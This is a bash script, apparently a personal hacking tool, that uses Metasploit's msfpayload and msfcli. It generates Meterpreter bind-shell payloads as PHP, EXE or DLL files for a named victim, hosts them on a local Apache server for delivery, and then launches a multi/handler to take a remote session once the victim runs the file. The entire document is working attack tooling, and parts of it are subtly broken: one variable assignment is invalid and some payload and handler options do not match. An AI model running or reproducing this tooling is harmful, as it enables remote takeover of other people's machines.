#!/bin/bash
#Script to generate bind payload and launch multihandler from metasploit
#Usage ./script port
#by n0b1dy
if [ $# -ne 4 ]; then
echo "[*]Usage: $0 <port> <e(X)e|(P)hp|(D)ll> <filename> <victim> "
exit
fi
start=`date`


echo "[*]---------------------------------[*]"
port=$1
type=$2
filename=$3
victim=$4
echo "[+]Bind Payload Generator.[$start]"
#saves current directory
dir=`echo $PWD`
#calculates target ip by default interface
$eth="eth0";
attacker=`ifconfig $eth | grep "inet " | cut -d: -f2 | cut -d" " -f1`
echo "[+]$attacker[=]--|-->[$port][$filename].$victim[=]"
MSFPAY=`which msfpayload`
MSFCLI=`which msfcli`
if [ $type == 'P' ]; then
echo "[+]Wait till we are Generating the [$filename].php"
$MSFPAY php/meterpreter/bind_tcp LPORT=$port R > $dir/$filename.php
echo "[+]Transfer the $filename.php to /var/www for delivery and starting webserver"
mv $filename.php /var/www
/etc/init.d/apache2 start
echo "[?]Have you executed $filename.php to $victim?"
read answer
echo "[+]Launching multihandler"
$MSFCLI multi/handler PAYLOAD=php/meterpreter/bind_tcp RHOST=$victim LPORT=$port E
end=`date`
clear
echo "[*]Bind Phun Generator.[$end]"
exit
fi
if [ $type == 'X' ]; then

echo "[+]Wait till we are Generating the [$filename].exe"
$MSFPAY windows/x64/meterpreter/bind_tcp RHOST=$victim LPORT=$port X > $dir/$filename.exe
echo "[+]Transfer the $filename.exe to /var/www for delivery and starting web server"
mv $filename.exe /var/www
/etc/init.d/apache2 start
echo "[?]Have you executed $filename.exe to $victim?"
read answer
echo "[+]Launching multihandler"
$MSFCLI multi/handler PAYLOAD=windows/x86/meterpreter/bind_tcp RHOST=$victim LPORT=$port E
end=`date`
clear
echo "[*]Bind Phun Generator.[$end]"
exit
fi

if [ $type == 'D' ]; then

echo "[+]Wait till we are Generating the [$filename].dll"
$MSFPAY windows/meterpreter/bind_tcp LHOST=$victim LPORT=$port D > $dir/$filename.dll
echo "[+]Transfer the $filename.dll to /var/www for delivery and starting web server"
mv $filename.dll /var/www
/etc/init.d/apache2 start
echo "[?]Have you executed $filename.dll to $victim?"
read answer
echo "[+]Launching multihandler"
$MSFCLI multi/handler PAYLOAD=windows/meterpreter/reverse_tcp LHOST=$victim LPORT=$port E
end=`date`
clear
echo "[*]Bind Phun Generator.[$end]"
exit
fi

